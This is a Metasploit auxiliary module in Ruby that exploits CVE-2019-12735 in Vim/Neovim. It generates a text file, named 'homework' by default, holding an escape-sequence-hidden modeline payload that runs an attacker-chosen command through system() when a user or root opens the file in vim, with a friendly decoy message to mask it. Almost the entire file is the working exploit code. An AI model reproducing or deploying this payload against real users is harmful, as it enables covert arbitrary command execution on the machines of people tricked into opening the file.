##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/vicmej/metaploit-framework
##
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = NormalRanking
	
	def initialize(info={})
		super(update_info(info,
			'Name' => "Vim/Neovim Arbitrary Code Execution via modelines",
			'Description' => %q{'This module inject malicious command into a file txt and execute when the user or root open it with vim editor'},
			'License' => MSF_LICENSE,
			'Author' => [ 'Victor Mejia <d4rkw01f>'],
			'Plataform' => [ 'Linux' ],
			'References' => ['CVE', '2019-12735'],
			'DisclosureDate' => 'Jun 20 2019'
		))

		register_options(
		[
			OptString.new('MSG', [false, 'Text to include in the file', 'Hello my friend']),
			OptString.new('CMD', [true, 'The command to include inside the file']),
			OptString.new('FILE', [false, 'The name of the malicious file', 'homework'])
		], self.class)
	end

	def run
		msg = datastore['MSG']
		cmd = datastore['CMD']
		file = datastore['FILE']

      
		code = "\x1b[?71\x1bS#{ msg }\x1b:silent! w | call system(\'nohup #{ cmd } & \') | redraw! | file | silent! \# \" vim: set fen fdm=expr fde=assert_fails('set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x27[K#{ msg } \" \x16\x1b[D \n"

		File.open( "#{ file }", "w") do |f|
			f.puts "#{ code }"
		end
	end
end
